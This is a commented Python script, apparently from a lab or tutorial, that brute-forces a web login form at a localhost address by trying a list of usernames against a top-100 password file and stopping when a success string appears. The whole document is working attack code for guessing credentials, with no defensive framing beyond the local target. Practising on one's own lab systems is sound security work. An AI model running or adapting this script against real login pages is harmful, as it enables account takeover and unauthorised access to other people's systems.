import requests
import sys

# Target URL where the login form is located
target = "http://127.0.0.1:8000/login.php"

# List of usernames to test
usernames = ["admin", "dan", "test", "carlos", "user"]

# Needle to search for in the response indicating a successful login
needle = "Welcome back"

# File containing a list of passwords to try
passwords = 'password-list-top-100.txt'

# Iterate over each username
for username in usernames:
    # Open the password list file
    with open(passwords, "r") as passwords_list:
        # Iterate over each password in the list
        for password in passwords_list:
            # Remove newline character and encode the password
            password = password.strip("\n").encode()

            # Display the current username and password combination being attempted
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
            sys.stdout.flush()

            # Send a POST request to the target URL with the username and password data
            r = requests.post(target, data={"username": username, "password": password})

            # Check if the response contains the needle indicating a successful login
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("[>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
                sys.exit()

        # If no password was found for the current username, display a message
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("--> No password found for '{}' <--".format(username))
        sys.stdout.write("\n")